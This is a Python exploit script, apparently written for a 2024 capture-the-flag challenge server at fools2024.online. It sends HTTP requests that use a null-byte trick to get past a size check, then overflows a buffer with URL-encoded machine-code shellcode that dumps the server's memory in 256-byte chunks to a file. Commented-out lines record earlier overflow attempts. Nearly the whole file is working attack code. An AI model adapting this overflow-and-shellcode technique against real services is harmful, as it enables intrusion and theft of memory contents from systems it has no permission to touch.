import time
import foolsocket
import struct


whole_ram = bytearray()


def main():
    for addr in range(0x100, 0x1000, 256):
        print(f"Dumping range: {hex(addr)} - {hex(addr+256)}")

        sock = foolsocket.FoolsSocket("fools2024.online", 26273)

        # SUFFIX = b"\r\n\r\n"
        # # TARGET = 253
        # TARGET = 256 - len(SUFFIX)
        # line = b'GET /secret?bepis'
        # line += b'A'* (TARGET - len(line))
        # line += SUFFIX

        # line = b'GET /secret?bepis\r\n\r\n'

        # line = b'GET /public\0?'
        # line += b'A' * 254 + b'\r'
        # line += b'B' * 254 + b'\r'
        # line += b'C' * 254 + b'\r'
        # line += b'D' * 254
        # line += b'\r\n\r\n'

        # Fills the entire wRequestData buffer
        # line = b'GET /secret?'
        # line += b'A\r' * ((2048 - 4 - len(line)) // 2)
        # line += b'\r\n\r\n'

        # Adding the null makes the server not complain about size
        # thus, the request is only handled until the first null byte
        # "HTTP" btw
        # line = b'A' * 254
        # line += b"\r\n\0"
        # 254 -> not mapped to any action
        # 255 -> request entity too large
        # line += b'B' * 255
        # line += b"\r\n\r\n"

        # IGNORE EVERYTHING ABOVE
        # Goofy size check bypass

        # THESE WORK
        # payload = b"\x0e\xff\x11\xf0\x41\x21\x00\xc8\x1a\x22\x13\x0d\xc2\x08\xda\x3e\x03\xe0\x80\x40\x18\xfd\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        # payload = b"\x0e\xff\x11\x0A\x04\x21\x00\xc8\x1a\x22\x13\x0d\xc2\x08\xda\x3e\x03\xe0\x80\x40\x18\xfd\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        # WORKIES
        payload = b"\x0E\xFF\x11\x00\x04\x21\x00\xC8\x1A\x47\xCB\x37\xE6\x0F\xC6\x30\x22\x78\xE6\x0F\xC6\x30\x22\x13\x0D\xC2\x08\xDA\x3E\x03\xE0\x80\x40\x18\xFD\x00"

        # breakies now
        payload = b"\x0E\xFF\x11"
        payload += struct.pack('<H', addr)
        payload += b"\x21\x00\xC8\x1A\x47\xCB\x37\xE6\x0F\xC6\x30\x22\x78\xE6\x0F\xC6\x30\x22\x13\x0D\xC2\x08\xDA\x3E\x03\xE0\x80\x40\x18\xFD\x00"
        payload += b"A" * (512 - len(payload))
        payload += b"\x00\xda" * 128
        line = b'\0'
        line += b'/secret?'

        # print("db ", end="")
        for b in payload:
            line += '%{:02x}'.format(b).encode('utf-8')
            # print('"%{:02x}", '.format(b), end="")
        # print()
        line += b'\r\n\r\n'
        line = line.replace(b'%41', b'A')

        print("Sending line:", line, "of length:", len(line))

        sock.communicate(line)
        resp = sock.read_until_eof()
        print(resp)

        # unfuck this now
        for i in range(0, len(resp), 2):
            a = resp[i]
            b = resp[i+1]

            hi = a - ord('0')
            lo = b - ord('0')

            value = (hi << 4) | lo

            print("{:02x} ".format(value), end="")

            try:
                print(chr(b), end="")
            except:
                print("?", end="")
                pass

            whole_ram.append(value)

        time.sleep(4)


    with open("RAM.bin", "wb") as f:
        f.write(whole_ram)


if __name__ == "__main__":
    main()

